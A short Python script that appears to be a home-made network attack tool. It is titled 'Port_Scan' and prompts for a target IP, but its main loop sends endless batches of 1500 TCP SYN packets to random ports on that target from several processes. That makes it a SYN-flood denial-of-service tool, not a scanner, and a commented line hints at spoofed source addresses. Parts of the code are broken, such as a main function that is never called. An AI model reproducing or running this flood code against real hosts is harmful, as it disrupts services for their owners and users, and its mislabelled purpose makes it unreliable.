
import scapy.all as scapy
import os
from multiprocessing import Pool

clear = os.system('clear')
print("**************************************")
print("             Port_Scan")
print("**************************************")
print("Please input your target's IP ")
target = input("[Port_Scan]#")

p={}

def Port_Scan_End():
	print("Port_Scan_End!")
	p.terminate()

def Port_Scan(name):
	num =0
	#src_ip ="123.123.123."+str(name) 

	try:
		while True:			
				packet = scapy.IP(dst=target)/scapy.TCP(dport=scapy.RandShort(),flags="S")
				scapy.send(packet,count=1500,verbose=False)
				num +=1
				print("Process:%s,Attack:%s"%(name,num))
	except KeyboardInterrupt:
		print("Go back")


def process():
	global p
	p = Pool(2)
	for i in range(3):
		p.apply_async(Port_Scan,args=(i,))
	print("Waiting for all subprocesses done....")
	p.close()
	p.join()
	print("All subprocesses done")
	
